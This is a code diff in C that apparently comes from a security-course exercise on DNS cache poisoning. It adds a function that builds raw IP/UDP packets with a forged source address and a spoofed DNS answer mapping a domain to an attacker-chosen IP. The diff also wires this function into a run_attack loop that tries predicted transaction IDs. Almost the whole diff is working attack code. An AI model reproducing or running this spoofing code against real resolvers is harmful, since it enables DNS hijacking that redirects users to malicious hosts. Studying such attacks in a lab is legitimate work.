@@ -12,6 +12,147 @@
 #define TAP1 0x80000057
 #define TAP2 0x80000062
 
+
+#include <sys/socket.h>
+#include <netinet/udp.h>
+#include <netinet/ip.h>
+
+// Constants
+#define PACKET_SIZE 512
+#define DNS_PORT 53
+
+// DNS Header structure
+struct dns_header {
+    unsigned short id;       // Transaction ID
+    unsigned short flags;    // Flags
+    unsigned short q_count;  // Questions count
+    unsigned short ans_count; // Answer count
+    unsigned short auth_count; // Authority count
+    unsigned short add_count; // Additional count
+};
+
+// Question structure
+struct dns_question {
+    unsigned short qtype;
+    unsigned short qclass;
+};
+
+// Resource Record structure
+struct dns_rr {
+    unsigned short name;
+    unsigned short type;
+    unsigned short _class;
+    unsigned int ttl;
+    unsigned short data_len;
+    unsigned int rdata; // Answer IP
+};
+
+// Function to calculate checksum
+unsigned short checksum(void *b, int len) {
+    unsigned short *buf = b;
+    unsigned int sum = 0;
+    unsigned short result;
+
+    for (sum = 0; len > 1; len -= 2)
+        sum += *buf++;
+    if (len == 1)
+        sum += *(unsigned char *)buf;
+
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    result = ~sum;
+
+    return result;
+}
+
+
+int full_spoofed_answer(uint txid, uint d_port) {
+    char buffer[PACKET_SIZE];
+    memset(buffer, 0, PACKET_SIZE);
+
+    // IP and UDP headers
+    struct iphdr *iph = (struct iphdr *)buffer;
+    struct udphdr *udph = (struct udphdr *)(buffer + sizeof(struct iphdr));
+
+    // DNS header
+    struct dns_header *dnsh = (struct dns_header *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
+
+    // Addresses
+    struct sockaddr_in dest;
+    char *domain = "example.com";
+    char *resolved_ip = "6.6.6.6";
+
+    // Set destination
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(d_port); // Destination port
+    dest.sin_addr.s_addr = inet_addr("192.168.1.203"); // Destination IP
+
+    // Fill in the IP header
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header) + 16);
+    iph->id = htonl(54321); // Identification
+    iph->frag_off = 0;
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = inet_addr("192.168.1.207"); // Source IP
+    iph->daddr = dest.sin_addr.s_addr;
+    iph->check = 0; // Will calculate later
+
+    // Fill in the UDP header
+    udph->source = htons(DNS_PORT);
+    udph->dest = dest.sin_port;
+    udph->len = htons(sizeof(struct udphdr) + sizeof(struct dns_header) + 16);
+    udph->check = 0; // Optional
+
+    // Fill in the DNS header
+    dnsh->id = htons(txid); // Transaction ID
+    dnsh->flags = htons(0x8180); // Standard response
+    dnsh->q_count = htons(1);   // One question
+    dnsh->ans_count = htons(1); // One answer
+    dnsh->auth_count = 0;
+    dnsh->add_count = 0;
+
+    // Add question and answer
+    char *qname = (char *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header));
+    strcpy(qname, "\7example\3com");
+    struct dns_question *qinfo = (struct dns_question *)(qname + strlen(qname) + 1);
+    qinfo->qtype = htons(1);  // A type
+    qinfo->qclass = htons(1); // IN class
+
+    struct dns_rr *ans = (struct dns_rr *)((char *)qinfo + sizeof(struct dns_question));
+    ans->name = htons(0xC00C); // Pointer to domain name
+    ans->type = htons(1);      // A record
+    ans->_class = htons(1);    // IN class
+    ans->ttl = htonl(3000);     // TTL
+    ans->data_len = htons(4);  // IP length
+    ans->rdata = inet_addr(resolved_ip);
+
+    // Calculate IP checksum
+    iph->check = checksum((unsigned short *)buffer, iph->tot_len);
+
+    // Create socket
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sock < 0) {
+        perror("Socket error");
+        exit(EXIT_FAILURE);
+    }
+
+    // Send packet
+    if (sendto(sock, buffer, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+        perror("Sendto error");
+        close(sock);
+        exit(EXIT_FAILURE);
+    }
+
+    printf("DNS response sent!\n");
+
+    close(sock);
+    return 0;
+}
+
+
 int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);
 
 // Structure for DNS header and response construction
@@ -220,7 +361,8 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
+        // send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
+        full_spoofed_answer(txid_ls[i], source_port);
         printf("sent spoofed response %d with txid %u\n", i, txid_ls[i]);
     }
     
